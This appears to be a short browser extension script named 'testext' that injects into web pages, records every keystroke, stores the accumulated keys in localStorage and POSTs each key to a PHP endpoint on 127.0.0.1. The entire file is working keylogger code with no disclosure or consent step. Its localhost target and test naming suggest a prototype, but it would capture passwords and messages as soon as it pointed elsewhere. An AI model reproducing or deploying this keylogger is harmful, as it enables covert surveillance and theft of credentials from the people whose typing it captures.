
document.body.style.border = "5px solid rgba(185,185,51,0.1)"; 

;(function(){
  console.log('testext::init');
  return setTimeout(()=>{
    console.log('testext::ignite');
    return testext_start();
  },1000);
})();

;async function testext_start(){
  let data=localStorage.getItem('_textext');
  console.log('testext::start');
  window.addEventListener('keyup',async function(e){
    console.log('testext::keyup::'+e.key);
    data+=e.key;
    localStorage.setItem('_textext',data);
    let url='http://127.0.0.1/testext.php',
    opt={
      mode:'cors',
      method:'POST',
      headers:{
        'Content-Type':'application/x-www-form-urlencoded',
      },
      body:new URLSearchParams({
        key:e.key,
      }).toString(),
    },
    res=await fetch(url,opt)
      .then(r=>r.text())
      .catch(e=>JSON.stringify(e));
    return res;
  },false);
};
